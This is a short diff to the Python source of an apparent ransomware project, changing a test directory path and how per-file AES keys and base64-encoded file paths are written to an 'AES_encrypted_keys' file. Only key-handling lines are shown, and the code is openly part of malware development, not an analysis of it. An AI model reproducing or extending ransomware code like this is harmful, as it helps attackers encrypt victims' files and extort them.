@@ -35,7 +35,7 @@ home = enviroment.get_home_path()
 desktop = enviroment.get_desktop_path()
 username = enviroment.get_username()
 ransomware_path = os.path.join(home, ransomware_name)
-test_path = "/home/tarcisio/teste/"
+test_path = "/home/tarcisio/tests/"
 
 def encrypt_priv_key(msg, key):
     line = msg
@@ -159,9 +159,9 @@ def menu():
     del aes_keys_and_base64_path
 
     # save to disk -> ENC(AES) BASE64(PATH)
-    with open(ransomware_path + "/AES_encrypted_keys", 'w') as f:
+    with open(ransomware_path + "/AES_encrypted_keys.txt", 'w') as f:
         for _ in enc_aes_key_and_base64_path:
-            line = _[0] + " " + _[1] + "\n"
+            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
             f.write(line)
 
     enc_aes_key_and_base64_path = None
